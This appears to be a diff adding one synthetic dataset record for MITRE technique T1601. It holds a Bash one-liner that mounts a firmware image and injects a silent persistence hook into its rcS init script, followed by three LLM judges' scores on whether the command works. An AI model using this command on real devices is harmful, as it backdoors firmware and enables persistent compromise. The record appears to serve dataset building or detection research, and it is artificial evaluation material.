@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "loopdev=$(losetup -fP --show /var/tmp/modified_system.img) && mount ${loopdev}p1 /mnt/img && cp /mnt/img/etc/init.d/rcS /tmp/rcS.bak && sed -i '1i /usr/local/bin/healthd --silent &' /mnt/img/etc/init.d/rcS && diff -u /tmp/rcS.bak /mnt/img/etc/init.d/rcS && umount /mnt/img && losetup -d \"$loopdev\"",
+  "explanation": "Mounts the modified firmware image partition, inserts a startup hook for persistence, and uses diff to validate that the init script inside the image was altered.",
+  "rationale_steps": [
+    "Attach the image to a loop device and mount its root partition (root privileges required).",
+    "Modify the init sequence to embed a malicious hook inside the image.",
+    "Diff the pre- and post-modification init script to confirm system image changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-6048333d-4a23db30",
+  "source_prompt_hash": "6048333d",
+  "timestamp_utc": "2025-09-30T04:32:34.003779Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The shell pipeline is well-formed with balanced quotes, proper && chaining, valid variable expansion, and recognized flags/options.",
+        "semantic_score": 3,
+        "semantic_justification": "The workflow aligns with T1601 by modifying an init script inside a mounted image to add persistence, but the sed command is malformed (missing the required backslash after 'i') and the operations generally require root privileges, so it likely fails to achieve the stated outcome as-is.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T18:20:05.322158Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper use of command substitution, valid losetup/mount/sed/diff flags, and correct chaining with && operators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1601 by loop-mounting a modified firmware image, injecting a persistent startup hook into the init script (rcS), validating the modification with diff, and cleanly unmounting — all operationally plausible steps for firmware image tampering on network devices.",
+        "combined_score": 5.0,
+        "confidence": 0.92,
+        "timestamp": "2026-02-19T01:17:53.202764Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses correct shell syntax, proper variable expansion, valid tool flags, and logical chaining with the && operator.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately demonstrates the process of mounting a firmware image partition, injecting a persistence mechanism into an init script, and cleaning up, which perfectly aligns with T1601.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-19T01:17:57.296913Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
